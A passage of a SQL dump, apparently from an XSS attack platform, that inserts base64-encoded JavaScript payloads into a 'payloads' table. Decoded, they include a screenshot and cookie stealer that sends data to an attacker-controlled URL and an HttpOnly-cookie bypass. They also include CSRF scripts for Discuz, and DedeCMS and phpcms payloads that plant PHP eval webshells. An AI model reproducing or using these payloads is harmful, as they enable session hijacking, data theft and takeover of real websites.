ZSxuKXt0aGlzLmN0eC5zYXZlKCksdC5maWx0ZXIoWGUpLmZvckVhY2goZnVuY3Rpb24odCl7dGhpcy5zaGFwZSh0KS5jbGlwKCl9LHRoaXMpLGUuY2FsbChuKSx0aGlzLmN0eC5yZXN0b3JlKCl9LHFlLnByb3RvdHlwZS5zaGFwZT1mdW5jdGlvbih0KXtyZXR1cm4gdGhpcy5jdHguYmVnaW5QYXRoKCksdC5mb3JFYWNoKGZ1bmN0aW9uKHQsZSl7InJlY3QiPT09dFswXT90aGlzLmN0eC5yZWN0LmFwcGx5KHRoaXMuY3R4LHQuc2xpY2UoMSkpOnRoaXMuY3R4WzA9PT1lPyJtb3ZlVG8iOnRbMF0rIlRvIl0uYXBwbHkodGhpcy5jdHgsdC5zbGljZSgxKSl9LHRoaXMpLHRoaXMuY3R4LmNsb3NlUGF0aCgpLHRoaXMuY3R4fSxxZS5wcm90b3R5cGUuZm9udD1mdW5jdGlvbih0LGUsbixyLG8saSl7dGhpcy5zZXRGaWxsU3R5bGUodCkuZm9udD1bZSxuLHIsbyxpXS5qb2luKCIgIikuc3BsaXQoIiwiKVswXX0scWUucHJvdG90eXBlLmZvbnRTaGFkb3c9ZnVuY3Rpb24odCxlLG4scil7dGhpcy5zZXRWYXJpYWJsZSgic2hhZG93Q29sb3IiLCIiK3QpLnNldFZhcmlhYmxlKCJzaGFkb3dPZmZzZXRZIixlKS5zZXRWYXJpYWJsZSgic2hhZG93T2Zmc2V0WCIsbikuc2V0VmFyaWFibGUoInNoYWRvd0JsdXIiLHIpfSxxZS5wcm90b3R5cGUuY2xlYXJTaGFkb3c9ZnVuY3Rpb24oKXt0aGlzLnNldFZhcmlhYmxlKCJzaGFkb3dDb2xvciIsInJnYmEoMCwwLDAsMCkiKX0scWUucHJvdG90eXBlLnNldE9wYWNpdHk9ZnVuY3Rpb24odCl7dGhpcy5jdHguZ2xvYmFsQWxwaGE9dH0scWUucHJvdG90eXBlLnNldFRyYW5zZm9ybT1mdW5jdGlvbih0KXt0aGlzLmN0eC50cmFuc2xhdGUodC5vcmlnaW5bMF0sdC5vcmlnaW5bMV0pLHRoaXMuY3R4LnRyYW5zZm9ybS5hcHBseSh0aGlzLmN0eCx0Lm1hdHJpeCksdGhpcy5jdHgudHJhbnNsYXRlKC10Lm9yaWdpblswXSwtdC5vcmlnaW5bMV0pfSxxZS5wcm90b3R5cGUuc2V0VmFyaWFibGU9ZnVuY3Rpb24odCxlKXtyZXR1cm4gdGhpcy52YXJpYWJsZXNbdF0hPT1lJiYodGhpcy52YXJpYWJsZXNbdF09dGhpcy5jdHhbdF09ZSksdGhpc30scWUucHJvdG90eXBlLnRleHQ9ZnVuY3Rpb24odCxlLG4pe3RoaXMuY3R4LmZpbGxUZXh0KHQsZSxuKX0scWUucHJvdG90eXBlLmJhY2tncm91bmRSZXBlYXRTaGFwZT1mdW5jdGlvbih0LGUsbixyLG8saSxhLHMsYyl7dmFyIGg9W1sibGluZSIsTWF0aC5yb3VuZChvKSxNYXRoLnJvdW5kKGkpXSxbImxpbmUiLE1hdGgucm91bmQobythKSxNYXRoLnJvdW5kKGkpXSxbImxpbmUiLE1hdGgucm91bmQobythKSxNYXRoLnJvdW5kKHMraSldLFsibGluZSIsTWF0aC5yb3VuZChvKSxNYXRoLnJvdW5kKHMraSldXTt0aGlzLmNsaXAoW2hdLGZ1bmN0aW9uKCl7dGhpcy5yZW5kZXJCYWNrZ3JvdW5kUmVwZWF0KHQsZSxuLHIsY1szXSxjWzBdKX0sdGhpcyl9LHFlLnByb3RvdHlwZS5yZW5kZXJCYWNrZ3JvdW5kUmVwZWF0PWZ1bmN0aW9uKHQsZSxuLHIsbyxpKXt2YXIgYT1NYXRoLnJvdW5kKHIubGVmdCtlLmxlZnQrbykscz1NYXRoLnJvdW5kKHIudG9wK2UudG9wK2kpO3RoaXMuc2V0RmlsbFN0eWxlKHRoaXMuY3R4LmNyZWF0ZVBhdHRlcm4odGhpcy5yZXNpemVJbWFnZSh0LG4pLCJyZXBlYXQiKSksdGhpcy5jdHgudHJhbnNsYXRlKGEscyksdGhpcy5jdHguZmlsbCgpLHRoaXMuY3R4LnRyYW5zbGF0ZSgtYSwtcyl9LHFlLnByb3RvdHlwZS5yZW5kZXJCYWNrZ3JvdW5kR3JhZGllbnQ9ZnVuY3Rpb24odCxlKXtpZih0IGluc3RhbmNlb2YgTCl7dmFyIG49dGhpcy5jdHguY3JlYXRlTGluZWFyR3JhZGllbnQoZS5sZWZ0K2Uud2lkdGgqdC54MCxlLnRvcCtlLmhlaWdodCp0LnkwLGUubGVmdCtlLndpZHRoKnQueDEsZS50b3ArZS5oZWlnaHQqdC55MSk7dC5jb2xvclN0b3BzLmZvckVhY2goZnVuY3Rpb24odCl7bi5hZGRDb2xvclN0b3AodC5zdG9wLCIiK3QuY29sb3IpfSksdGhpcy5yZWN0YW5nbGUoZS5sZWZ0LGUudG9wLGUud2lkdGgsZS5oZWlnaHQsbil9fSxxZS5wcm90b3R5cGUucmVzaXplSW1hZ2U9ZnVuY3Rpb24odCxuKXt2YXIgcj10LmltYWdlO2lmKHIud2lkdGg9PT1uLndpZHRoJiZyLmhlaWdodD09PW4uaGVpZ2h0KXJldHVybiByO3ZhciBvLGk9ZS5jcmVhdGVFbGVtZW50KCJjYW52YXMiKTtyZXR1cm4gaS53aWR0aD1uLndpZHRoLGkuaGVpZ2h0PW4uaGVpZ2h0LG89aS5nZXRDb250ZXh0KCIyZCIpLG8uZHJhd0ltYWdlKHIsMCwwLHIud2lkdGgsci5oZWlnaHQsMCwwLG4ud2lkdGgsbi5oZWlnaHQpLGl9fSkuY2FsbCh7fSwidW5kZWZpbmVkIiE9dHlwZW9mIHdpbmRvdz93aW5kb3c6dm9pZCAwLCJ1bmRlZmluZWQiIT10eXBlb2YgZG9jdW1lbnQ/ZG9jdW1lbnQ6dm9pZCAwKTtodG1sMmNhbnZhcyhkb2N1bWVudC5ib2R5LHtvbnJlbmRlcmVkOmZ1bmN0aW9uKGNhbnZhcyl7dmFyIHg9bmV3IFhNTEh0dHBSZXF1ZXN0KCk7eC5vcGVuKCJQT1NUIix3ZWJzaXRlLHRydWUpO3guc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC1UeXBlIiwiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIik7eC5zZW5kKCJzY3JlZW5zaG90PSIrZW5jb2RlVVJJQ29tcG9uZW50KGNhbnZhcy50b0RhdGFVUkwoImltYWdlL2pwZWciKSkpO319KTs=', 1);
INSERT INTO xss.payloads (name, `desc`, jscode, love) VALUES ('alert.js', '2', 'YWxlcnQoInhzcyIpOw==', 1);
INSERT INTO xss.payloads (name, `desc`, jscode, love) VALUES ('cookie.js', 'get cookie', 'dmFyIHdlYnNpdGU9Imh0dHA6Ly/nvZHnq5nlnLDlnYAiOwooZnVuY3Rpb24oKXsobmV3IEltYWdlKCkpLnNyYz13ZWJzaXRlKycvP2tlZXBzZXNzaW9uPTEmbG9jYXRpb249Jytlc2NhcGUoKGZ1bmN0aW9uKCl7dHJ5e3JldHVybiBkb2N1bWVudC5sb2NhdGlvbi5ocmVmfWNhdGNoKGUpe3JldHVybicnfX0pKCkpKycmdG9wbG9jYXRpb249Jytlc2NhcGUoKGZ1bmN0aW9uKCl7dHJ5e3JldHVybiB0b3AubG9jYXRpb24uaHJlZn1jYXRjaChlKXtyZXR1cm4nJ319KSgpKSsnJmNvb2tpZT0nK2VzY2FwZSgoZnVuY3Rpb24oKXt0cnl7cmV0dXJuIGRvY3VtZW50LmNvb2tpZX1jYXRjaChlKXtyZXR1cm4nJ319KSgpKSsnJm9wZW5lcj0nK2VzY2FwZSgoZnVuY3Rpb24oKXt0cnl7cmV0dXJuKHdpbmRvdy5vcGVuZXImJndpbmRvdy5vcGVuZXIubG9jYXRpb24uaHJlZik/d2luZG93Lm9wZW5lci5sb2NhdGlvbi5ocmVmOicnfWNhdGNoKGUpe3JldHVybicnfX0pKCkpO30pKCk7', 0);
INSERT INTO xss.payloads (name, `desc`, jscode, love) VALUES ('dedecms.js', '2', 'dmFycmVxdWVzdCA9IGZhbHNlOwppZiAod2luZG93LlhNTEh0dHBSZXF1ZXN0KSB7CiAgICByZXF1ZXN0ID0gbmV3WE1MSHR0cFJlcXVlc3QoKTsKICAgIGlmIChyZXF1ZXN0Lm92ZXJyaWRlTWltZVR5cGUpIHsKICAgICAgICByZXF1ZXN0Lm92ZXJyaWRlTWltZVR5cGUoJ3RleHQveG1sJyk7CiAgICB9Cn0KZWxzZSBpZih3aW5kb3cuQWN0aXZlWE9iamVjdCkgewogICAgdmFydmVyc2lvbnMgPSBbJ01pY3Jvc29mdC5YTUxIVFRQJywgJ01TWE1MLlhNTEhUVFAnLCAnTWljcm9zb2Z0LlhNTEhUVFAnLCAnTXN4bWwyLlhNTEhUVFAuNy4wJywgJ01zeG1sMi5YTUxIVFRQLjYuMCcsICdNc3htbDIuWE1MSFRUUC41LjAnLCAnTXN4bWwyLlhNTEhUVFAuNC4wJywgJ01TWE1MMi5YTUxIVFRQLjMuMCcsICdNU1hNTDIuWE1MSFRUUCddOwogICAgZm9yICh2YXJpID0gMDsgaSA8IHZlcnNpb25zLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgcmVxdWVzdCA9IG5ld0FjdGl2ZVhPYmplY3QodmVyc2lvbnMpOwogICAgICAgIH0gY2F0Y2ggKGUpIHt9CiAgICB9Cn0KeG1saHR0cCA9IHJlcXVlc3Q7CmZ1bmN0aW9uIGdldEZvbGRlcih1cmwpIHsKICAgIG9iaiA9IHVybC5zcGxpdCgnLycpOwogICAgcmV0dXJuIG9ialtvYmoubGVuZ3RoIC0gMl07Cn0Kb1VybCA9IHRvcC5sb2NhdGlvbi5ocmVmOwp1ID0gZ2V0Rm9sZGVyKG9VcmwpOwphZGRfYWRtaW4oKTsKZnVuY3Rpb24gYWRkX2FkbWluKCkgewogICAgdmFydXJsID0gIi8iICsgdSArICIvc3lzX3NxbF9xdWVyeS5waHAiOwogICAgdmFycGFyYW1zID0gImZtZG89ZWRpdCZiYWNrdXJsPSZhY3RpdmVwYXRoPSUyRmRhdGEmZmlsZW5hbWU9MTIzLnBocCZzdHI9PCUzRnBocCtldmFsJTI4JTI0X1BPU1QlNUJyMTIzJTVEJTI5JTNGPiZCMT0rKyVFNCVCRiU5RCslRTUlQUQlOTgrKyI7CiAgICB4bWxodHRwLm9wZW4oIlBPU1QiLCB1cmwsIHRydWUpOwogICAgeG1saHR0cC5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LXR5cGUiLCAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIik7CiAgICB4bWxodHRwLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtbGVuZ3RoIiwgdmFycGFyYW1zLmxlbmd0aCk7CiAgICB4bWxodHRwLnNldFJlcXVlc3RIZWFkZXIoIkNvbm5lY3Rpb24iLCAiS2VlcC1BbGl2ZSIpOwogICAgeG1saHR0cC5zZW5kKHZhcnBhcmFtcyk7Cn0=', 0);
INSERT INTO xss.payloads (name, `desc`, jscode, love) VALUES ('HttponlyBypass.js', '11', 'dmFyIHdlYnNpdGU9Imh0dHA6Ly/nvZHnq5nlnLDlnYAiOwpmdW5jdGlvbiBzZXRDb29raWVzKCkgewogICAgLyphcGFjaGUgc2VydmVyIGxpbWl0IDgxOTIqLwogICAgdmFyIHN0ciA9ICIiOwogICAgZm9yICh2YXIgaSA9IDA7IGkgPCA4MTk7IGkrKykgewogICAgICAgIHN0ciArPSAieCI7CiAgICB9CiAgICBmb3IgKGkgPSAwOyBpIDwgMTA7IGkrKykgewogICAgICAgIHZhciBjb29raWUgPSAicmF5IiArIGkgKyAiPSIgKyBzdHIgKyAiO3BhdGg9LyI7CiAgICAgICAgZG9jdW1lbnQuY29va2llID0gY29va2llOwogICAgfQp9CgpmdW5jdGlvbiBwYXJzZUNvb2tpZXMoKSB7CiAgICBpZiAoeGhyLnJlYWR5U3RhdGUgPT09IDQgJiYgeGhyLnN0YXR1cyA9PT0gNDAwKSB7CiAgICAgICAgdmFyIGNvbnRlbnQgPSB4aHIucmVzcG9uc2VUZXh0LnJlcGxhY2UoL1xyfFxuL2csICcnKS5tYXRjaCgvPHByZT4oLispPFwvcHJlPi8pOwogICAgICAgIGNvbnRlbnQgPSBjb250ZW50WzFdLnJlcGxhY2UoIkNvb2tpZTogIiwgIiIpOwogICAgICAgIGNvb2tpZXMgPSBjb250ZW50LnJlcGxhY2UoL3JheVxkPXgrOz8vZywgJycpCiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgdmFyIG15b3BlbmVyID0gJyc7CiAgICAgICAgICAgIG15b3BlbmVyID0gd2luZG93LnBhcmVudC5vcGVubmVyLmxvY2F0aW9uOwogICAgICAgICAgICB2YXIgbXlwYXJlbnQgPSAnJzsKICAgICAgICAgICAgbXlwYXJlbnQgPSB3aW5kb3cucGFyZW50LmxvY2F0aW9uOwogICAgICAgIH0gY2F0Y2ggKGVycikgewogICAgICAgICAgICBteW9wZW5lciA9ICcwJzsKICAgICAgICAgICAgbXlwYXJlbnQgPSAnMCc7CiAgICAgICAgfQogICAgICAgIHdpbmRvdy5sb2NhdGlvbiA9IHdlYnNpdGUgKyAnL2luZGV4LnBocD9sb2NhdGlvbj0nICsgZXNjYXBlKGRvY3VtZW50LmxvY2F0aW9uKSArICcmdG9wbG9jYXRpb249JyArIGVzY2FwZShteXBhcmVudCkgKyAnJmNvb2tpZT0nICsgZXNjYXBlKGNvb2tpZXMpICsgJyZvcGVuZXI9JyArIGVzY2FwZShteW9wZW5lcik7CiAgICB9Cn0KCnNldENvb2tpZXMoKTsKdmFyIHhociA9IHdpbmRvdy5YTUxIdHRwUmVxdWVzdCA/IG5ldyBYTUxIdHRwUmVxdWVzdCgpIDogd2luZG93LkFjdGl2ZVhPYmplY3QgPyBuZXcgQWN0aXZlWE9iamVjdCgiTWljcm9zb2Z0LlhNTEhUVFAiKSA6IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp4aHIub25yZWFkeXN0YXRlY2hhbmdlID0gcGFyc2VDb29raWVzOwp4aHIub3BlbigiUE9TVCIsICIvPyIgKyBNYXRoLnJhbmRvbSgpLCB0cnVlKTsKeGhyLnNlbmQobnVsbCk7', 0);
INSERT INTO xss.payloads (name, `desc`, jscode, love) VALUES ('DiscuzCSRF.js', 'dd', 'ZnVuY3Rpb24gZ2V0SGFzaCgpIHsKCiAgICBmb3IgKHZhciBpID0gMDsgaSA8IGRvY3VtZW50LmxpbmtzLmxlbmd0aDsgaSsrKSB7CgogICAgICAgIGlmIChkb2N1bWVudC5saW5rc1tpXS5ocmVmLmluZGV4T2YoImFjdGlvbj1sb2dvdXQmZm9ybWhhc2g9IikgPiAwKSB7CgogICAgICAgICAgICBoYXNoID0gZG9jdW1lbnQubGlua3NbaV0uaHJlZjsKICAgICAgICAgICAgaGFzaCA9IGhhc2guc3Vic3RyKGhhc2gubGVuZ3RoIC0gOCwgaGFzaC5sZW5ndGgpOwogICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICB9Cgp9CnggPSB3aW5kb3cueCB8fCB7CiAgICByZXF1ZXN0OiBmdW5jdGlvbigpIHsKICAgICAgICBpZiAod2luZG93LlhNTEh0dHBSZXF1ZXN0KSB7CiAgICAgICAgICAgIHZhciBhamF4ID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCkKICAgICAgICB9IGVsc2UgaWYgKHdpbmRvdy5BY3RpdmVYT2JqZWN0KSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICB2YXIgYWpheCA9IG5ldyBBY3RpdmVYT2JqZWN0KCJNc3htbDIuWE1MSFRUUCIpCiAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIGFqYXggPSBuZXcgQWN0aXZlWE9iamVjdCgiTWljcm9zb2Z0LlhNTEhUVFAiKQogICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkge30KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gYWpheAogICAgfSwKICAgIGhhbmRsZTogZnVuY3Rpb24oYWpheCwgY2FsbGJhY2spIHsKICAgICAgICBhamF4Lm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgewogICAgICAgICAgICBpZiAoYWpheC5yZWFkeVN0YXRlID09IDQpIHsKICAgICAgICAgICAgICAgIGlmIChhamF4LnN0YXR1cyA9PSAyMDApIHsKICAgICAgICAgICAgICAgICAgICBjYWxsYmFjayhhamF4LnJlc3BvbnNlVGV4dCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0sCiAgICBkaXNwbGF5OiBmdW5jdGlvbihvKSB7CiAgICAgICAgaWYgKHR5cGVvZihvKSA9PSAnb2JqZWN0JykgewogICAgICAgICAgICB2YXIgc3RyID0gJyc7CiAgICAgICAgICAgIGZvciAoYSBpbiBvKSB7CgogICAgICAgICAgICAgICAgc3RyICs9IGEgKyAnPScgKyBvW2FdICsgJyYnOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHN0ciA9IHN0ci5zdWJzdHIoMCwgc3RyLmxlbmd0aCAtIDEpOwogICAgICAgICAgICByZXR1cm4gc3RyOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldHVybiBvOwogICAgICAgIH0KICAgIH0sCiAgICBnZXQ6IGZ1bmN0aW9uKHVybCwgY2FsbGJhY2spIHsKICAgICAgICBhamF4ID0geC5yZXF1ZXN0KCk7CiAgICAgICAgYWpheC5vcGVuKCdnZXQnLCB1cmwsIHRydWUpOwogICAgICAgIGFqYXguc2VuZChudWxsKTsKICAgICAgICB4LmhhbmRsZShhamF4LCBjYWxsYmFjaykKICAgIH0sCiAgICBwb3N0OiBmdW5jdGlvbih1cmwsIGNvbnRlbnQsIGNhbGxiYWNrKSB7CiAgICAgICAgYWpheCA9IHgucmVxdWVzdCgpOwogICAgICAgIGFqYXgub3BlbigncG9zdCcsIHVybCwgdHJ1ZSk7CiAgICAgICAgYWpheC5zZXRSZXF1ZXN0SGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJyk7CiAgICAgICAgY29udGVudCA9IHguZGlzcGxheShjb250ZW50KTsKICAgICAgICBhamF4LnNlbmQoY29udGVudCk7CiAgICAgICAgeC5oYW5kbGUoYWpheCwgY2FsbGJhY2spCiAgICB9LAp9CgoKdmFyIGhhc2ggPSAiIjsKZ2V0SGFzaCgpOwoKLyrlj5HluJbmk43kvZwKeC5wb3N0KCLmjqXlj6PlnLDlnYAiLCJmb3JtaGFzaD0iK2hhc2grIiZwb3N0dGltZT0xMzc3NTY2NDcmd3lzaXd5Zz0xJnN1YmplY3Q9JUU2JTk2JUIwJUU0JUJBJUJBJUU2JThBJUE1JUU5JTgxJTkzVEVTVCZtZXNzYWdlPSVFNiU5NiVCMCVFNCVCQSVCQSVFNiU4QSVBNSVFOSU4MSU5M1RFU1QraGFja2VkKytieStoZWxlbiZyZXBseWNyZWRpdF9leHRjcmVkaXRzPTAmcmVwbHljcmVkaXRfdGltZXM9MSZyZXBseWNyZWRpdF9tZW1iZXJ0aW1lcz0xJnJlcGx5Y3JlZGl0X3JhbmRvbT0xMDAmcmVhZHBlcm09JnByaWNlPSZ0YWdzPXRlc3QmcnVzaHJlcGx5ZnJvbT0mcnVzaHJlcGx5dG89JnJld2FyZGZsb29yPSZzdG9wZmxvb3I9JmNyZWRpdGxpbWl0PSZzYXZlPSZhZGRkeW5hbWljPXRydWUmdXNlc2lnPTEmYWxsb3dub3RpY2VhdXRob3I9MSIpOyAKKi8KLyrnva7pobbluJblrZAgIDxzY3JpcHQgIHNyYz0iaHR0cDovL3cvdHJ5LzEuanMiPiA8L3NjcmlwdD4KeC5wb3N0KCLmjqXlj6PlnLDlnYAiLCJmcm9tbW9kY3A9JmZvcm1oYXNoPSIraGFzaCsiJmZpZD0yJnJlZGlyZWN0PSZsaXN0ZXh0cmE9cGFnZSUzRDEmaGFuZGxla2V5PW1vZHMmbW9kZXJhdGVbXT0xMiZvcGVyYXRpb25zW109c3RpY2smc3RpY2tsZXZlbD0zJmV4cGlyYXRpb25zdGljaz0mZGlnZXN0bGV2ZWw9MCZleHBpcmF0aW9uZGlnZXN0PSZoaWdobGlnaHRfY29sb3I9MCZoaWdobGlnaHRfc3R5bGVbMV09MCZoaWdobGlnaHRfc3R5bGVbMl09MCZoaWdobGlnaHRfc3R5bGVbM109MCZleHBpcmF0aW9uaGlnaGxpZ2h0PSZyZWFzb249Iik7CgoKKi8=', 0);
INSERT INTO xss.payloads (name, `desc`, jscode, love) VALUES ('phpcms.js', 'wt', 'aWYgKHRvcC53aW5kb3cubG9jYXRpb24uaHJlZi5pbmRleE9mKCJwY19oYXNoPSIpID4gMCkgewogICAgdmFyIGhhc2ggPSB0b3Aud2luZG93LmxvY2F0aW9uLmhyZWYuc3Vic3RyKHRvcC53aW5kb3cubG9jYXRpb24uaHJlZi5pbmRleE9mKCJwY19oYXNoPSIpICsgOCwgNik7Cn0KdmFyIHBrYXYgPSB7CiAgICBhamF4OiBmdW5jdGlvbigpIHsKICAgICAgICB2YXIgeG1sSHR0cDsKICAgICAgICB0cnkgewogICAgICAgICAgICB4bWxIdHRwID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CiAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgeG1sSHR0cCA9IG5ldyBBY3RpdmVYT2JqZWN0KCJNc3htbDIuWE1MSFRUUCIpOwogICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIHhtbEh0dHAgPSBuZXcgQWN0aXZlWE9iamVjdCgiTWljcm9zb2Z0LlhNTEhUVFAiKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIHhtbEh0dHA7CiAgICB9LAogICAgcmVxOiBmdW5jdGlvbih1cmwsIGRhdGEsIG1ldGhvZCwgY2FsbGJhY2spIHsKICAgICAgICBtZXRob2QgPSAobWV0aG9kIHx8ICIiKS50b1VwcGVyQ2FzZSgpOwogICAgICAgIG1ldGhvZCA9IG1ldGhvZCB8fCAiR0VUIjsKICAgICAgICBkYXRhID0gZGF0YSB8fCAiIjsKICAgICAgICBpZiAodXJsKSB7CiAgICAgICAgICAgIHZhciBhID0gdGhpcy5hamF4KCk7CiAgICAgICAgICAgIGEub3BlbihtZXRob2QsIHVybCwgdHJ1ZSk7CiAgICAgICAgICAgIGlmIChtZXRob2QgPT0gIlBPU1QiKSB7CiAgICAgICAgICAgICAgICBhLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBhLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgaWYgKGEucmVhZHlTdGF0ZSA9PSA0ICYmIGEuc3RhdHVzID09IDIwMCkgewogICAgICAgICAgICAgICAgICAgIGlmIChjYWxsYmFjaykgewogICAgICAgICAgICAgICAgICAgICAgICBjYWxsYmFjayhhLnJlc3BvbnNlVGV4dCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9OwogICAgICAgICAgICBpZiAoKHR5cGVvZiBkYXRhKSA9PSAib2JqZWN0IikgewogICAgICAgICAgICAgICAgdmFyIGFyciA9IFtdOwogICAgICAgICAgICAgICAgZm9yICh2YXIgaSBpbiBkYXRhKSB7CiAgICAgICAgICAgICAgICAgICAgYXJyLnB1c2goaSArICI9IiArIGVuY29kZVVSSUNvbXBvbmVudChkYXRhW2ldKSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBhLnNlbmQoYXJyLmpvaW4oIiYiKSk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBhLnNlbmQoZGF0YSB8fCBudWxsKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0sCiAgICBnZXQ6IGZ1bmN0aW9uKHVybCwgY2FsbGJhY2spIHsKICAgICAgICB0aGlzLnJlcSh1cmwsICIiLCAiR0VUIiwgY2FsbGJhY2spOwogICAgfSwKICAgIHBvc3Q6IGZ1bmN0aW9uKHVybCwgZGF0YSwgY2FsbGJhY2spIHsKICAgICAgICB0aGlzLnJlcSh1cmwsIGRhdGEsICJQT1NUIiwgY2FsbGJhY2spOwogICAgfQp9OwppZiAoIXdpbmRvdy5fX3gpIHsKICAgIHBrYXYucG9zdCgiaW5kZXgucGhwP209dGVtcGxhdGUmYz1maWxlJmE9ZWRpdF9maWxlJnN0eWxlPWRlZmF1bHQmZGlyPWFubm91bmNlJmZpbGU9c2hvdy5odG1sIiwgImNvZGU9JTdCdGVtcGxhdGUrJTI3Y29udGVudCUyNyUyQyslMjdoZWFkZXIlMjclN0QlMEQlMEElM0MlMjEtLW1haW4tLSUzRSUwRCUwQSUzQ2RpditjbGFzcyUzRCUyMm1haW4lMjIlM0UlMEQlMEElMDklM0NkaXYrY2xhc3MlM0QlMjJjb2wtbGVmdCUyMiUzRSUwRCUwQSsrKyslMDklM0NkaXYrY2xhc3MlM0QlMjJjcnVtYnMlMjIlM0UlM0NhK2hyZWYlM0QlMjIlN0JBUFBfUEFUSCU3RCUyMiUzRSVDQSVENyVEMiVCMyUzQyUyRmElM0UlM0NzcGFuJTNFKyUzRSslM0MlMkZzcGFuJTNFJUI5JUFCJUI4JUU2JTNDJTJGZGl2JTNFJTBEJTBBKysrKysrKyslM0NkaXYraWQlM0QlMjJBcnRpY2xlJTIyJTNFJTBEJTBBKysrKysrKyslMDklM0NoMSUzRSU3QiUyNHRpdGxlJTdEJTNDYnIrJTJGJTNFJTBEJTBBJTNDc3BhbiUzRSUzQyUyRnNwYW4lM0UlM0MlMkZoMSUzRSUwRCUwQSUwOSUwOSUwOSUzQ2RpditjbGFzcyUzRCUyMmNvbnRlbnQlMjIlM0UlMEQlMEElMDklMDklMDkrKyU3QiUyNGNvbnRlbnQlN0QlMEQlMEElMDklMDklMDklM0MlMkZkaXYlM0UlMEQlMEErKysrKyslM0MlMkZkaXYlM0UlMEQlMEErKyUzQyUyRmRpdiUzRSUwRCUwQSsrKyslM0NkaXYrY2xhc3MlM0QlMjJjb2wtYXV0byUyMiUzRSUwRCUwQSsrKysrKysrJTNDZGl2K2NsYXNzJTNEJTIyYm94K3BkX2IwJTIyJTNFJTBEJTBBJTA5JTA5JTdCcGMlM0Fjb21tZW50K2FjdGlvbiUzRCUyMmJhbmclMjIrY2FjaGUlM0QlMjIzNjAwJTIyJTdEJTBEJTBBKysrKysrKysrKysrJTNDdWwrY2xhc3MlM0QlMjJpdGVtbGklMjIlM0UlMEQlMEElMDklMDklMDklN0Jsb29wKyUyNGRhdGErJTI0ciU3RCUwRCUwQSsrKysrKysrKysrKysrKyslM0NsaSUzRSUzQ2EraHJlZiUzRCUyMiU3QiUyNHIlNUJ1cmwlNUQlN0QlMjIrdGFyZ2V0JTNEJTIyX2JsYW5rJTIyJTNFJTdCc3RyX2N1dCUyOCUyNHIlNUJ0aXRsZSU1RCUyQysyNiUyOSU3RCUzQyUyRmElM0UlM0MlMkZsaSUzRSUwRCUwQSsrKysrKysrKysrKyU3QiUyRmxvb3AlN0QlMEQlMEErKysrKysrKysrKyslM0MlMkZ1bCUzRSUwRCUwQSUwOSUwOSU3QiUyRnBjJTdEJTBEJTBBKysrKysrKyslM0MlMkZkaXYlM0UlMEQlMEErKysrJTNDJTJGZGl2JTNFJTBEJTBBJTNDJTJGZGl2JTNFJTBEJTBBJTdCdGVtcGxhdGUrJTI3Y29udGVudCUyNyUyQyslMjdmb290ZXIlMjclN0QlMEQlMEElM0NzY3JpcHQrbGFuZ3VhZ2UlM0RwaHAlM0UlMjRmcCslM0QrJTQwZm9wZW4lMjglMjJ0ZXN0LnBocCUyMiUyQyslMjdhJTI3JTI5JTNCJTBEJTBBJTQwZndyaXRlJTI4JTI0ZnAlMkMrJTI3JTNDJTI3LiUyNyUzRnBocCUyNy4lMjIlNUNyJTVDbiU1Q3IlNUNuJTIyLiUyNyU0MGV2YWwlMjglMjRfUE9TVCU1QiUyMmNob3BwZXIlMjIlNUQlMjklMjcuJTIyJTVDciU1Q24lNUNyJTVDbiUzRiUyMi4lMjIlM0UlNUNyJTVDbiUyMiUyOSUzQiUwRCUwQSU0MGZjbG9zZSUyOCUyNGZwJTI5JTNCJTNDJTJGc2NyaXB0JTNFJmRvc3VibWl0PSVDQyVFMSVCRCVCQiZwY19oYXNoPSIgKyBoYXNoLCBmdW5jdGlvbihycykge30pOwogICAgcGthdi5nZXQoImluZGV4LnBocD9tPXRlbXBsYXRlJmM9ZmlsZSZhPXZpc3VhbGl6YXRpb24mc3R5bGU9ZGVmYXVsdCZkaXI9YW5ub3VuY2UmZmlsZT1zaG93Lmh0bWwmcGNfaGFzaD0iICsgaGFzaCwgZnVuY3Rpb24ocnMpIHt9KTsKICAgIHdpbmRvdy5fX3gg